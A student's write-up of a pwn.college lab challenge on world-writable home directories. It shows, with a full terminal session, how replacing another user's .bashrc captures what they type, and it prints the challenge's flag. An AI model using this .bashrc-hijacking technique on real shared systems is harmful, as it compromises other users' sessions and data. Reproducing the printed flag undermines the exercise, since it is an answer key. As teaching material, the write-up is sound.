# Silly Shenanigins 

## Overshared Directories
Alright Zardus has wised up --- why would he havse a writeable .bashrc anyway? But a more common scenario is that users on the same system, to make it easier to collabrate, will make their home directories world writeable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collabaration. And then a hacker comes along and does the following, despite not owning the todo-list file!

```bash
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```

This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content

### Objective
In this challenge, for convenience, Zardus opened up his home directory. As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{MouaAaQoRV8TZgPXbatZfK8lfl_.QXwQTM3EDLygjN0czW}`

- In this challenge, we cannot directly change the .bashrc file like we did in the last one because this time, the .bashrc file is not writeable instead we have the write access to Zardus' home directory. 
- So, just like in the last challenge, I first created the flag_checker file but this time in the `/home/zardus` directory and gave it executable permissions. Then I added `/home/zardus` to the PATH variable. 
- Just to confirm the new location of the flag_checker file, I used the `which` command as well. Once confirmed, I ran the `/challenge/victim` command. But something strange happened and instead of executing the flag_checker script that I provided, the command still executed the one provided by the challenge. This shouldn't have happened now.
- I rechecked all the steps that I took and they were correct but even after running the challenge again and again, it still wasn't running my flag_checker script.
- Then as a last resort, I deleted the .bashrc file and made a new one. In the new one, I executed the flag_checker command inside the .bashrc script and stored its output in a different file. Then I used `cat` to display the stolen output. 
- This time when I ran the challenge, I got the flag.

```bash
hacker@shenanigans~overshared-directories:~$ cd /home/zardus
hacker@shenanigans~overshared-directories:/home/zardus$ ls
hacker@shenanigans~overshared-directories:/home/zardus$ nano flag_checker
hacker@shenanigans~overshared-directories:/home/zardus$ mv flag_chekcer .bashrc
mv: cannot stat 'flag_chekcer': No such file or directory
hacker@shenanigans~overshared-directories:/home/zardus$ ls
flag_checker
hacker@shenanigans~overshared-directories:/home/zardus$ mv flag_checker .bashrc
mv: replace '.bashrc', overriding mode 0644 (rw-r--r--)? y
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
flag_checker
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ nano flag_checker
hacker@shenanigans~overshared-directories:/home/zardus$ cat .bashrc
#!/bin/bash 

echo flag_checker > stolen_flag.txt
cat stolen_flag.txt
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
cat: flag_checker: No such file or directory
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ rm .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
cat: flag_checker: No such file or directory
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ which flag_checker
/run/challenge/bin/flag_checker
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
#!/opt/pwn.college/bash

echo -n "Type the flag, victim: "
read -r candidate

echo
if [ "$candidate" = "$(cat /flag)" ]; then
    echo "Correct!"
    exit 0
else
    echo "Incorrect!"
    exit 1
fi
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
/run/challenge/bin/flag_checker
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ cat .bashrc
#!/bin/bash

/run/challenge/bin/flag_checker > stolen.txt
cat stolen.txt
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
flag_checker
Type the flag, victim: 
Incorrect!
zardus@shenanigans~overshared-directories:~$ ************************************************************-bash: pwn.college{MouaAaQoRV8TZgPXbatZfK8lfl_.QXwQTM3EDLygjN0czW}: command not found
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ 
```

### New Learnings
1. When the directories are made world writeable, anyone can write and delete file in it, including the .bashrc. That way anyone can make new .bashrc and if made with malicious intentions, it might cause an issue.